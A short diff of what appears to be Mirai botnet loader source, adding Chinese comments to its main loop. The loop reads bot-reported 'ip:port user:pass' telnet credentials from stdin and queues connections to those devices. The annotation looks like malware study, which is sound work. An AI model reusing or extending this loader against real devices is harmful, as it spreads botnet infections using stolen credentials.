@@ -61,7 +61,7 @@ int main(int argc, char **args)
 
     pthread_create(&stats_thrd, NULL, stats_thread, NULL);
 
-    // Read from stdin
+    // Read from stdin　　　从stdin读入scanListen的print ,即从bot上报的ip:port user:pass信息
     while (TRUE)
     {
         char strbuf[1024];
@@ -79,7 +79,7 @@ int main(int argc, char **args)
 
         memset(&info, 0, sizeof(struct telnet_info));
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
-        //解析telnet信息
+        //解析从bot返回的信息
         if (telnet_info_parse(strbuf, &info) == NULL)
             printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
         else
@@ -87,7 +87,7 @@ int main(int argc, char **args)
             if (srv == NULL)
                 printf("srv == NULL 2\n");
             //添加新节点，与新节点建立连接，添加进epoll中
-            server_queue_telnet(srv, &info);
+            server_queue_telnet(srv, &info);//与telnet返回的ip:port建立连接
             if (total++ % 1000 == 0)
                 sleep(1);
         }
